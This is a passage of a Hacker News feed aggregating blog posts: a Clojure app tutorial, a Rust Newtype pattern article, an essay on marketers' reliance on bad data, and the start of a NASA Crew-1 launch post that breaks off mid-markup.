<p><span>For better results, it is best to combine card sorting with another information architecture research method – Tree Testing. You can read about how to use them together in your </span><a href="https://blog.uxtweak.com/card-sorting-tree-testing-best-friends/"><span>Card sorting &amp; tree testing = best friends</span></a><span>.</span></p>
          </div></div>]]>
            </description>
            <link>https://blog.uxtweak.com/card-sorting-101/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016973</guid>
            <pubDate>Sat, 07 Nov 2020 18:08:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Clojure App Development]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25016920">thread link</a>) | @hogaur
<br/>
November 7, 2020 | http://hariomgaur.in/2020/11/06/learning-clojure.html | <a href="https://web.archive.org/web/*/http://hariomgaur.in/2020/11/06/learning-clojure.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>A step-by-step guide to getting started with application development in Clojure Programming Language.</em></p>

<p>In the previous blog, we learned the fundamentals of Clojure programming language. We also got used to the interactive Clojure development using the REPL and performed some basic operations in the REPL. In this blog, we will continue to learn by doing. Because, says Yoda -</p>

<p><img src="http://hariomgaur.in/2020/11/06/yoda-clojure.jpeg">
</p>


<p>We will learn how to create a basic Clojure application, and also how to load and execute code written in static source files into the REPL. As promised in part one, loop-recur and first-class function support are also covered in this blog. If you are new to Clojure programming language, I highly recommend for you to go through <a href="http://hariomgaur.in/2020/09/20/clojure-getting-started.html">Getting Started With Clojure</a> first.</p>

<blockquote>
  <p>After a well-received step-by-step tutorial for getting started with Clojure, here is the much-awaited part two that builds up right from where we left in part one.  I hope this content helps folks understand some of the necessary and essential nuances while programming in Clojure programming language.</p>
</blockquote>

<h3 id="a-brand-new-app">A Brand New App</h3>


<p>This simple command gets you going while starting the development of your app in Clojure programming language. It also helps maintain a sane and basic folder structure for your app. It is equivalent to <code>rails new</code> for all practical purposes. It gets you something like following in a folder called <code>strung</code> in the working directory.</p>

<div><div><pre><code>/Users/hariomgaur/strung/
▾ doc/
    intro.md
▾ resources/
▾ src/app/
    core.clj
▾ test/app/
    core_test.clj
  CHANGELOG.md
  LICENSE
  project.clj
  README.md
</code></pre></div></div>

<p>Few things to note -</p>
<ul>
  <li>Filenames in Clojure projects are in snake case like <code>ruby</code> :D</li>
  <li>There are separate directories for <code>src</code> and <code>test</code> unlike <code>golang</code></li>
  <li>A very special <code>project.clj</code> file.</li>
</ul>

<p>That’s a pretty good folder structure that Leiningen scaffolds for you. Let’s understand what are different parts of a typical Clojure app first.</p>
<ul>
  <li>The <code>resources</code> directory is for assets like <code>config.edn</code> etc.</li>
  <li>The <code>src</code> folder is where the Code goes.</li>
  <li>The <code>test</code> folder is where the tests go.</li>
  <li>The <code>project.clj</code> file is a particular configuration file with information like the version of our app <code>strung</code> etc. It also specifies <code>strung</code>’s dependencies and workflows related to <code>strung</code>.</li>
  <li><code>CHANGELOG.md</code> is a place to keep a comprehensive log of changes to <code>strung</code> as suggested in <a href="https://keepachangelog.com/en/1.0.0/">Keep a Changelog</a> site.</li>
  <li><code>README.md</code>, as you must already be aware, is used to maintain a user-friendly guide to the app <code>strung</code>.</li>
  <li><code>LICENSE</code> contains licensing information.</li>
</ul>

<h3 id="testing-the-waters">Testing the Waters</h3>

<p>Let’s add the following piece of code in <code>core_test.clj</code> and run <code>lein test</code>.</p>

<div><div><pre><code>(deftest string-equals-string-test
  (testing "That a string is equal to itself"
    (is (strequals? "string" "string"))))
</code></pre></div></div>

<p>We see a pretty neat output explaining the results of our test run. What
does it say?</p>
<div><div><pre><code>Ran 2 tests containing 2 assertions.
1 failures, 0 errors.
Tests failed.
</code></pre></div></div>

<p>In this case, the test fails because the code doesn’t understand the function <code>strequals?</code> yet. See if you figured that out from the following error message -</p>

<div><div><pre><code>Caused by: java.lang.RuntimeException: Unable to resolve
symbol: strequals? in this context
</code></pre></div></div>

<p>Leiningen reports both <code>failures</code> and <code>errors</code> on each test run. Failures are the number of test cases where computation’s actual result didn’t match the expected value, also known as assertion failures. In contrast, the errors are the number of cases where the process crashed because of an error thrown during execution.</p>

<p>Now, Let’s add the following to the <code>core.clj</code> file -</p>

<div><div><pre><code>(defn strequals?
  "Checks whether two strings are equal"
  [string1 string2]
  true)
</code></pre></div></div>

<p>Rerun the tests, and you see that it passes now. Voila!</p>

<p>Congratulations, you just wrote your first test and the first function to make it pass in Clojure programming language.</p>

<h3 id="loading-and-executing-code-in-the-repl">Loading and Executing Code in the REPL</h3>

<div><div><pre><code>$ lein repl
user=&gt;(require 'strung.core)
nil
user=&gt;(in-ns 'strung.core)
nil
strung.core=&gt;(strequals?)
ArityException Wrong number of args (0) passed to: core/strequals?  clojure.lang.AFn.throwArity (AFn.java:429)
strung.core=&gt; (strequals? "abv" "abv")
true
strung.core=&gt;
</code></pre></div></div>
<p>In the above example, we started the REPL by simply firing the <code>lein repl</code> command on the terminal. To run a function already declared in a namespace, we first need to require that namespace in the REPL using the <code>(require 'strung.core)</code> where <code>strung.core</code> is the namespace where the required function is defined. Then, we need to run <code>in-ns</code> to jump into the required namespace. And by just doing these two steps, we can run any function defined in a given namespace.</p>

<blockquote>
  <p>You might have noticed that we have put a single quote in front of the namespace’s name while calling <code>require</code> and <code>in-ns</code>. The <code>quote</code> or <code>'</code> is used to render an unevaluated form. While passing arguments to a function, if there need be that you don’t want to evaluate the contents you are passing to the function call, you can use <code>'</code> to pass them as it is without being evaluated beforehand.</p>
</blockquote>

<h3 id="defining--grouping-tests-in-clojure">Defining &amp; Grouping Tests in Clojure</h3>

<p>Clojure has an inbuilt <code>clojure.test</code> unit-testing framework. Unit testing is about testing the smallest part of your Code in isolation. The underlying idea is that all the small-small parts of your Code have to work and perform as per their specification for whole of your app to work in entirety.</p>

<p>Typically, the unit under test is a function. One can define a test using <code>deftest</code> in Clojure and group multiple assertions together with <code>testing</code>. Assertions are the core of any testing framework. Clojure provides assertions with an already defined <code>is</code> macro with which you can check any arbitrary expressions. Simple, isn’t it? e.g.</p>

<div><div><pre><code>user=&gt; (require '[clojure.test :refer :all])
user=&gt; (is (= 5 (+ 2 2)))

FAIL in () (NO_SOURCE_FILE:1)
expected: (= 5 (+ 2 2))
  actual: (not (= 5 4))
false
user=&gt; (is (= 4 (+ 2 2)))
true
user=&gt;
</code></pre></div></div>

<h3 id="functions-functions-everywhere">Functions functions everywhere</h3>
<p>You can define a function in Clojure by merely calling <code>defn</code>.</p>
<div><div><pre><code>user=&gt; (defn my-func []
(println "You rock, dear lil punk"))
#'user/my-func
user=&gt; (my-func)
You rock, dear lil punk
nil
user=&gt;
</code></pre></div></div>
<p>You can specify the arguments that you want to call the function within the square brackets after the function name, and they will be available for your use in the function body. e.g.</p>
<div><div><pre><code>user=&gt; (defn my-func [name]
(println (str "You rock, " name ". You lil punk!")))
#'user/my-func
user=&gt; (my-func "hogaur")
You rock, hogaur. You lil punk!
nil
user=&gt;
</code></pre></div></div>
<p>One can create a function using <code>(fn [] ..)</code> as well. This returns a value that can be bound to a name and can be passed to another function, and can be returned from your funciton etc.</p>

<h3 id="looping-in-clojure">Looping in Clojure</h3>

<p>Let’s understand the looping in Clojure with an example,</p>
<div><div><pre><code>user=&gt; (def names ["deba" "shukla" "guru" "hari"])
user=&gt; (loop [x names] 
  (when (pos? (count x))
    (println (str "friend of - " (first x))) 
    (recur (rest x))))
friend of deba
friend of shukla
friend of guru
friend of hari
nil
user=&gt;
</code></pre></div></div>
<p>You would have noticed by now that the <code>loop</code> form in Clojure is not similar to the <code>for</code> construct in many other programming languages. It is like the way it is there to do recursion based iterations rather than making changes with side-effects based looping.</p>

<p>The <code>loop</code> in Clojure starts with initial binding values for the loop. In our example above, we are binding x with names. We had already defined names a line before, and here we tell the <code>loop</code> form to start looping with the initial value of x as defined by the names. Then there is the loop body.</p>

<p>An interesting thing to note here is that it includes a <code>recur</code> form inside it. The <code>recur</code> form must have the same number of bindings as defined in the loop’s starting. We then use the <code>when</code> conditional to see if the size of <code>x</code> is greater than 0 with <code>(pos? (count names))</code>.</p>

<p>We print the first name in a formatted string <code>(str "friend of" (first names))</code> if the size is greater than 0 and ask to rerun the loop with the rest of the names <code>(rest names)</code>. The loop exits when the condition fails to match i.e., when all the names are taken out using the rest function, and the size of names drop to zero.</p>

<h3 id="epilogue">Epilogue</h3>

<p><img src="http://hariomgaur.in/2020/11/06/clojure-gloves-on.jpeg"></p>


<p>That’s it for today folks. Hope the content in this post helped you get
your hands dirty with some Clojure programming. I certainly have got my
Clojure gloves on, have you?</p>

<p>I am a Product Engineer, leading the event-driven development framework team in Gojek. I have been writing Clojure for the past three years on and off at work.</p>

<p>On a day to day basis, I work on improving the <a href="https://github.com/gojek/ziggurat">Ziggurat framework</a> that we have built at Gojek. More than 250 applications run in production that leverage the power of this framework to consume, process millions of events every minute to deliver business value. If you like what we do, don’t forget to star the repo and leave your suggestions and feature requests in Github’s issues section.</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="http://hariomgaur.in/2020/09/20/clojure-getting-started.html">Getting Started With Clojure</a></li>
  <li><a href="https://github.com/technomancy/leiningen/blob/stable/doc/TUTORIAL.md">Leiningen Getting Started</a></li>
  <li><a href="https://clojure.org/about/functional_programming">Clojure Functional Programming</a></li>
  <li><a href="https://clojuredocs.org/clojure.test">Clojure Testing Framework</a></li>
  <li><a href="https://clojuredocs.org/clojure.core/loop">Looping in Clojure</a></li>
</ul>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>http://hariomgaur.in/2020/11/06/learning-clojure.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016920</guid>
            <pubDate>Sat, 07 Nov 2020 18:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newtype Pattern in Rust]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25016696">thread link</a>) | @jworthe
<br/>
November 7, 2020 | https://www.worthe-it.co.za/blog/2020-10-31-newtype-pattern-in-rust.html | <a href="https://web.archive.org/web/*/https://www.worthe-it.co.za/blog/2020-10-31-newtype-pattern-in-rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2>Abstract</h2><p>Programming design patterns are patterns that come up in a variety of
different situations while programming. In this article I discuss the
Newtype design pattern. Specifically, I discuss it in the context of
the Rust programming language, and how to solve some of the problems
that arise when using the Newtype pattern in Rust.</p></div></section><h2>Design Patterns in Rust</h2><section><p>Programming design patterns are patterns that come up in a variety of
different situations while programming. That isn't to say that design
patterns mean you don't need to think about the problem yourself, but
design patterns give you a toolbox of ideas to help you think about
solutions.</p><p>Different programming languages have different ways of expressing
things. The classic book on design patterns, <a href="https://en.wikipedia.org/wiki/Design_Patterns">Design Patterns: Elements
of Reusable Object-Oriented Software</a>, wrote patterns around object
oriented C++ and Smalltalk. While most of these patterns are still
applicable to other object oriented programming languages, they might
need a tweak here and there to make them work well.</p><p>Rust is an interesting programming language in that the design of the
language takes ideas from object oriented, procedural, and <a href="https://www.worthe-it.co.za/blog/2018-02-11-why-functional-programmers-should-care-about-rust.html">functional</a>
programming languages. This means that there are different patterns
that are useful, and the existing patterns may be better expressed in
a new way.</p><p>In this article, I'm going to explain a pattern that I've been finding
useful in my Rust code: The Newtype Pattern.</p></section><h2>The Problem: Primitive Types Aren't Descriptive</h2><section><p>Imagine that you're working on a large codebase. Like many projects,
your project includes some user information, so you have a struct that
looks like this:</p><div><pre><span>pub struct </span><span>Person {
    </span><span>pub </span><span>name: String,
    </span><span>pub </span><span>phone_number: String,
    </span><span>pub </span><span>id_number: String,
    </span><span>pub </span><span>age: </span><span>u32
</span><span>}
</span></pre></div><p>A few months down the line, you're looking at some code on the other
side of the codebase. You want to get a person out of your
database. This is the function signature:</p><div><pre><span>pub fn </span><span>load_person</span><span>(person: String) -&gt; Result&lt;Person&gt;;
</span></pre></div><p>Oh dear. What is that parameter supposed to be? Is it the person's ID
number? Their name maybe?</p><p>Then there's the uncertainty on what exactly <code>age</code> means. How would
you, for example, implement this function?</p><div><pre><span>pub fn </span><span>time_to_retirement</span><span>(current_age: </span><span>u32</span><span>) -&gt; </span><span>u32</span><span>;
</span></pre></div><p>Is it age in years? It's common to store timestamps in as a number of
seconds, so maybe it's age in seconds?</p></section><h2>The Newtype Pattern</h2><section><p>The Newtype patterns is when you take an existing type, usually a
primitive like a number or a string, and wrap it in a struct. This
lets us add more information about the data to the type system to
potentially catch errors, and make our code more expressive.</p><p>Let's see how we would apply it to our person example.</p><p>You'd first define your Newtypes. The pattern is just a value, wrapped
in a <code>struct</code>.</p><div><pre><span>pub struct </span><span>Name(String);
</span><span>pub struct </span><span>PhoneNumber(String);
</span><span>pub struct </span><span>IdNumber(String);
</span><span>pub struct </span><span>Years(</span><span>u32</span><span>);
</span></pre></div><blockquote><p>If you haven't encountered a <code>struct</code> like this where we don't name
the fields, it's called a <a href="https://doc.rust-lang.org/book/ch05-01-defining-structs.html#using-tuple-structs-without-named-fields-to-create-different-types">tuple struct</a>. The Newtype is a special case
of tuple struct, where we only have one field.</p></blockquote><p>Then you can start using your new types in your <code>Person</code> struct.</p><div><pre><span>pub struct </span><span>Person {
    </span><span>pub </span><span>name: Name,
    </span><span>pub </span><span>phone_number: PhoneNumber,
    </span><span>pub </span><span>id_number: IdNumber,
    </span><span>pub </span><span>age: Years
}
</span></pre></div><p>As a benefit, our <code>load_person</code> function is much clearer. If the type
is <code>IdNumber</code>, rather than <code>String</code>, you know to use the person's ID
number.</p><div><pre><span>pub fn </span><span>load_person</span><span>(person: IdNumber) -&gt; Result&lt;Person&gt;;
</span></pre></div><p>Our age is also much clearer now too. The <code>Years</code> type makes it
obvious that our age is in years, not seconds.</p><div><pre><span>pub fn </span><span>time_to_retirement</span><span>(current_age: Years) -&gt; Years;
</span></pre></div><p>Strings are a common use case for Newtypes, since you can use them to
add validation around formatting of the string. For example, in South
Africa, <a href="https://www.worthe-it.co.za/blog/2017-02-12-validating-a-south-african-id-number-in-javascript.html">ID Numbers have a set format that you can validate against</a>.</p></section><h2>Problem 1: How Do I Construct The Newtype?</h2><section><p>You may have noticed in the examples above that the Newtype itself is
public, but the internal data is private. In its current form, this
code won't work:</p><div><pre><span>// Usually other modules would actually be in a different file, but
// this isn't a normal project, it's a blog article! After this example
// we won't explicitly be putting our Newtypes in a different module
// to simplify the examples.
</span><span>mod </span><span>some_module {
    </span><span>pub struct </span><span>PhoneNumber(String);
}

</span><span>fn </span><span>main</span><span>() {
    </span><span>// You would be able to access the private inner string directly
    // like this if this code was in the same module as the newtype,
    // but for the rest of the codebase this will fail.
    </span><span>let</span><span> num </span><span>= </span><span>some_module::PhoneNumber(</span><span>"555-12345"</span><span>.</span><span>to_string</span><span>());
    println!(</span><span>"</span><span>{}</span><span>"</span><span>, num.</span><span>0</span><span>)
}
</span></pre></div><pre><span>error[E0603]: tuple struct constructor `PhoneNumber` is private
 --&gt; rust-src-b5wQbx.rs:9:28
  |
2 |     pub struct PhoneNumber(String);
  |                            ------ a constructor is private if any of the fields is private
...
9 |     let num = some_module::PhoneNumber("555-12345".to_string());
  |                            ^^^^^^^^^^^ private tuple struct constructor
  |
note: the tuple struct constructor `PhoneNumber` is defined here
 --&gt; rust-src-b5wQbx.rs:2:5
  |
2 |     pub struct PhoneNumber(String);
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

error[E0616]: field `0` of struct `some_module::PhoneNumber` is private
  --&gt; rust-src-b5wQbx.rs:10:24
   |
10 |     println!("{}", num.0)
   |                        ^ private field
</span></pre><p>How exactly you handle this will depend on your type. Generally
speaking, you can give your type some functions, like a constructor
function and some function to get the data out. This would work:</p><div><pre><span>pub struct </span><span>PhoneNumber(String);
</span><span>impl </span><span>PhoneNumber {
    </span><span>pub fn </span><span>new</span><span>(s: String) -&gt; PhoneNumber {
        PhoneNumber(s)
    }
    </span><span>pub fn </span><span>as_str</span><span>(</span><span>&amp;</span><span>self) -&gt; </span><span>&amp;str </span><span>{
        </span><span>// We didn't name the inner type, so it follows the same
        // naming convention as tuples. In other words, the inner
        // field is called `0`.
        </span><span>&amp;</span><span>self.</span><span>0
    </span><span>}
}

</span><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> num </span><span>= </span><span>PhoneNumber::new(</span><span>"555-1234"</span><span>.</span><span>to_string</span><span>());
    println!(</span><span>"</span><span>{}</span><span>"</span><span>, num.</span><span>as_str</span><span>())
}
</span></pre></div><p>You can add as many other functions as you want here. It's a great
place to put any domain logic you might have around your data. For
example, phone numbers might have different standard formattings that
different contexts require, or you might be able to use the start of
the phone number to figure out the country it refers to.</p></section><h2>Some Useful Standard Library Traits</h2><section><p>The two example functions I used above, constructing your type from a
string and formatting the data as a string, seem like they would come
up when looking at many different types. In fact, the Rust standard
library has a number of traits that it makes sense to implement for
your Newtype. Implementing the standard library traits rather than
just your own functions will make it easier to use your Newtype
together with the standard library, and many other Rust
libraries. Let's take a look at some of them.</p></section><h3>FromStr and Display</h3><section><p>If, like in our phone number example, we're specifically interesting
in working with strings, then there are two traits from the standard
library that we should implement: <a href="https://doc.rust-lang.org/stable/std/str/trait.FromStr.html">FromStr</a> and <a href="https://doc.rust-lang.org/stable/std/fmt/trait.Display.html">Display</a>.</p><div><pre><span>pub struct </span><span>PhoneNumber(String);

</span><span>use </span><span>std::str::FromStr;
</span><span>impl </span><span>FromStr </span><span>for </span><span>PhoneNumber {
    </span><span>type </span><span>Err </span><span>= </span><span>Box&lt;dyn std::error::Error&gt;;

    </span><span>fn </span><span>from_str</span><span>(s: </span><span>&amp;str</span><span>) -&gt; Result&lt;</span><span>Self</span><span>, </span><span>Self::</span><span>Err&gt; {
        </span><span>Ok</span><span>(PhoneNumber(s.</span><span>to_string</span><span>()))
    }
}

</span><span>use </span><span>std::fmt;
</span><span>impl </span><span>fmt::Display </span><span>for </span><span>PhoneNumber {
    </span><span>fn </span><span>fmt</span><span>(</span><span>&amp;</span><span>self, f: </span><span>&amp;mut </span><span>fmt::Formatter&lt;'</span><span>_</span><span>&gt;) -&gt; fmt::Result {
        write!(f, </span><span>"</span><span>{}</span><span>"</span><span>, self.</span><span>0</span><span>)
    }
}

</span><span>fn </span><span>main</span><span>() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    </span><span>// parse() uses FromStr
    </span><span>let</span><span> num: PhoneNumber </span><span>= </span><span>"555-1234"</span><span>.</span><span>parse</span><span>()</span><span>?</span><span>;

    </span><span>// you can also call from_str directly
    </span><span>let</span><span> num </span><span>= </span><span>PhoneNumber::from_str(</span><span>"555-1234"</span><span>)</span><span>?</span><span>;

    </span><span>// Display gives you a to_string function
    </span><span>let</span><span> num_as_string </span><span>=</span><span> num.</span><span>to_string</span><span>();

    </span><span>// Display can also be called directly by println! or format!
    </span><span>println!(</span><span>"Phone number is </span><span>{}</span><span>"</span><span>, num);
    </span><span>Ok</span><span>(())
}
</span></pre></div></section><h3>Deref</h3><section><p>If you're wrapping a string, implementing <a href="https://doc.rust-lang.org/stable/std/ops/trait.Deref.html">Deref</a> can also be useful. It
will let you pass your string-wrapping Newtype into functions that
require a <code>&amp;str</code>.</p><p>More generally, <code>Deref</code> is useful if you want to tell the compiler
that, if it needs to, it can take an immutable reference to the data
you're wrapping.</p><div><pre><span>pub struct </span><span>PhoneNumber(String);

</span><span>use </span><span>std::str::FromStr;
</span><span>impl </span><span>FromStr </span><span>for </span><span>PhoneNumber {
    </span><span>type </span><span>Err </span><span>= </span><span>Box&lt;dyn std::error::Error&gt;;

    </span><span>fn </span><span>from_str</span><span>(s: </span><span>&amp;str</span><span>) -&gt; Result&lt;</span><span>Self</span><span>, </span><span>Self::</span><span>Err&gt; {
        </span><span>Ok</span><span>(PhoneNumber(s.</span><span>to_string</span><span>()))
    }
}

</span><span>use </span><span>std::ops::Deref;
</span><span>impl </span><span>Deref </span><span>for </span><span>PhoneNumber {
    </span><span>type </span><span>Target </span><span>= str</span><span>;

    </span><span>fn </span><span>deref</span><span>(</span><span>&amp;</span><span>self) -&gt; </span><span>&amp;Self::</span><span>Target {
        </span><span>&amp;</span><span>self.</span><span>0
    </span><span>}
}

</span><span>fn </span><span>main</span><span>() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    </span><span>let</span><span> num </span><span>= </span><span>PhoneNumber::from_str(</span><span>"555-1234"</span><span>)</span><span>?</span><span>;

    </span><span>// Deref can be called when we take a reference. The function
    // takes a &amp;str and our type can Deref from &amp;PhoneNumber to &amp;str.
    </span><span>print_strings</span><span>(</span><span>&amp;</span><span>num);
    </span><span>Ok</span><span>(())
}

</span><span>fn </span><span>print_strings</span><span>(s: </span><span>&amp;str</span><span>) {
    println!(</span><span>"I've been asked to print </span><span>{}</span><span>"</span><span>, s);
}
</span></pre></div><p><code>Deref</code> is called behind the scenes by the compiler and having an
implementation of <code>Deref</code> may affect which functions the compiler
calls when you're using your type. It's meant for when you're
implementing smart pointers. If you want functionality similar to
<code>Deref</code>, but don't want to let the compiler call it implicitly, a good
alternative is to add your own function with a name of your choice,
like <code>as_str</code>.</p><div><pre><span>pub struct </span><span>PhoneNumber(String);

</span><span>use </span><span>std::str::FromStr;
</span><span>impl </span><span>FromStr </span><span>for </span><span>PhoneNumber {
    </span><span>type </span><span>Err </span><span>= </span><span>Box&lt;dyn std::error::Error&gt;;

    </span><span>fn </span><span>from_str</span><span>(s: </span><span>&amp;str</span><span>) -&gt; Result&lt;</span><span>Self</span><span>, </span><span>Self::</span><span>Err&gt; {
        </span><span>Ok</span><span>(PhoneNumber(s.</span><span>to_string</span><span>()))
    }
}

</span><span>impl </span><span>PhoneNumber {
    </span><span>fn </span><span>as_str</span><span>(</span><span>&amp;</span><span>self) -&gt; </span><span>&amp;str </span><span>{
        </span><span>&amp;</span><span>self.</span><span>0
    </span><span>}
}

</span><span>fn </span><span>main</span><span>() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    </span><span>let</span><span> num </span><span>= </span><span>PhoneNumber::from_str(</span><span>"555-1234"</span><span>)</span><span>?</span><span>;

    </span><span>// Since we didn't implement Deref, the compiler can't convert to
    // a string implicitly, but it's still possible for us to do that
    // dereferencing explicitly.
    </span><span>print_strings</span><span>(num.</span><span>as_str</span><span>());
    </span><span>Ok</span><span>(())
}

</span><span>fn </span><span>print_strings</span><span>(s: </span><span>&amp;str</span><span>) {
   …</span></pre></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.worthe-it.co.za/blog/2020-10-31-newtype-pattern-in-rust.html">https://www.worthe-it.co.za/blog/2020-10-31-newtype-pattern-in-rust.html</a></em></p>]]>
            </description>
            <link>https://www.worthe-it.co.za/blog/2020-10-31-newtype-pattern-in-rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016696</guid>
            <pubDate>Sat, 07 Nov 2020 17:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Marketers are addicted to bad data]]>
            </title>
            <description>
<![CDATA[
Score 353 | Comments 108 (<a href="https://news.ycombinator.com/item?id=25016532">thread link</a>) | @iamacyborg
<br/>
November 7, 2020 | https://www.jacquescorbytuech.com/writing/marketers-addicted-bad-data | <a href="https://web.archive.org/web/*/https://www.jacquescorbytuech.com/writing/marketers-addicted-bad-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content">
<article>
<header>

</header>
<p><small><time datetime="2020-11-07T15:45:00+00:00">
      Sat 07 November 2020
    </time></small>
</p>
<div>
<p>Modern marketing is all about data and however hard you might try, you can't spend any time around marketers online without <a href="https://blog.marketo.com/2013/11/prove-your-worth10-kpis-for-marketers.html">being</a> <a href="https://www.searchenginejournal.com/paid-owned-earned-content/242075/">subjected</a> <a href="https://blogs.oracle.com/oracledatacloud/effectively-measuring-advertising-performance-your-guide-to-success">to</a> <a href="https://searchengineland.com/using-auction-insights-for-better-ppc-competitor-analysis-343264">endless</a> <a href="https://www.searchenginewatch.com/2020/07/28/10-reasons-why-marketers-use-data-to-make-budgeting-decisions/">think</a> <a href="https://www.oberlo.co.uk/blog/spent-200000-facebook-ads-heres-learned">pieces</a>, how-to guides, ebooks or other dreck about how we need to track and measure and count every little thing.</p>
<p>We've got click rates, impressions, conversion rates, open rates, ROAS, pageviews, bounces rates, ROI, CPM, CPC, impression share, average position, sessions, channels, landing pages, KPI after never ending KPI.</p>
<p>That'd be fine if all this shit meant something and we knew how to interpret it. But <em>it doesn't</em> and <strong>we don't</strong>. </p>
<p>The reality is much simpler, and therefore much more complex.  Most of us don't understand how data is collected, how these mechanisms work and most importantly where and how they <em>don't</em> work.</p>
<ul>
<li><a href="https://www.statista.com/statistics/874736/ad-blocker-usage-in-united-kingdom/">36% percent of people in the UK</a> use an adblocker, which means your javascript based website tracking is meaningless</li>
<li>Email open rates <a href="https://developermedia.com/email-open-rates-misleading-metrics-best-practices-2/">don't <em>actually</em> indicate that an email was opened</a>, merely that a request was made to a server</li>
<li>The black boxes inside Facebook and other ad exchanges give you <a href="https://www.etcentric.org/facebook-agrees-to-40-million-fine-for-incorrect-ad-metrics/">flat out wrong</a> data about how your ads are performing</li>
<li>The audiences you're targeting on Google, Bing, etc <a href="https://www.forbes.com/sites/augustinefou/2020/11/02/got-large-budgets-you-need-to-spend-fraudsters-will-help-you-spend-it/?sh=54b93f867a9f">are fraudulent</a> and don't even exist</li>
<li>The exchanges you're purchasing media space from are <a href="https://www.adexchanger.com/mobile/is-ubers-new-ad-fraud-lawsuit-futile-or-game-changing/">cheating you</a></li>
</ul>
<p>And even if we know how the data is collected, what it means and what it's actually tracking, most of us don't have the technical chops to analyse the data we've collected<sup id="fnref:1"><a href="#fn:1">1</a></sup>. I don't mean to rag on anyone by saying this, but we do need a reality check.</p>
<p>And look. I get it. Having tangible data allows us to demonstrate that we're doing our job and we're trying to measure and improve what we're doing. But as Bob Hoffman rightly points out - <a href="http://adcontrarian.blogspot.com/2020/09/the-mystery-of-modern-media.html">that's not how brands are built</a>. </p>
<p>The numbers are often all we have to prove our case, to get more budget and in extreme cases, to continue to stay employed. We'll remain in this mess until we can separate marketing from short sighted and poorly informed decision making. Until leaders can lead on the strength of their conviction and experience instead of second guessing themselves and their staff based on the inadequacy of data.</p>
<p>I don't know what the way out of this mess is, or what the path to success looks like. All I know is this.</p>
<p><em>We're addicted to bad data</em>.</p>

<p>Cheers,</p>
<p><img src="https://www.jacquescorbytuech.com/images/jacques.png">
</p></div>
<div>
<h4>Subscribe for updates</h4>

<p>Updates, whenever I've got something valuable to say.</p>
</div>
</article>
</section></div>]]>
            </description>
            <link>https://www.jacquescorbytuech.com/writing/marketers-addicted-bad-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016532</guid>
            <pubDate>Sat, 07 Nov 2020 17:27:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NASA’s SpaceX Crew-1 mission is launching on Nov. 14]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25016505">thread link</a>) | @jimgordon
<br/>
November 7, 2020 | https://maggrand.com/nasas-spacex-crew-1-mission-is-launching-on-nov-14/ | <a href="https://web.archive.org/web/*/https://maggrand.com/nasas-spacex-crew-1-mission-is-launching-on-nov-14/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1381">
	
		<div>
<figure>
<img src="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=678%2C381&amp;ssl=1" alt="NASA astronauts" title="nasa">
</figure>

<p>Crew Dragon Resilience has ARRIVED.⁣ The SpaceX Crew Dragon spacecraft for NASA’s SpaceX Crew-1 mission arrived at Kennedy Space Center’s Launch Complex 39A on Thursday, Nov. 5, after making the trek from its processing facility at nearby Cape Canaveral Air Force Station in Florida.</p>



<figure><img data-attachment-id="1382" data-permalink="https://maggrand.com/nasas-spacex-crew-1-mission-is-launching-on-nov-14/123968368_167377225042487_7862924137847646970_n/" data-orig-file="https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?fit=1080%2C1080&amp;ssl=1" data-orig-size="1080,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="NASA Launches First Crew Rotation Flight on US Commercial Spacecraft" data-image-description="" data-medium-file="https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?fit=678%2C678&amp;ssl=1" loading="lazy" width="678" height="678" src="https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=678%2C678&amp;ssl=1" alt="NASA Launches First Crew Rotation Flight on US Commercial Spacecraft" srcset="https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=1024%2C1024&amp;ssl=1 1024w, 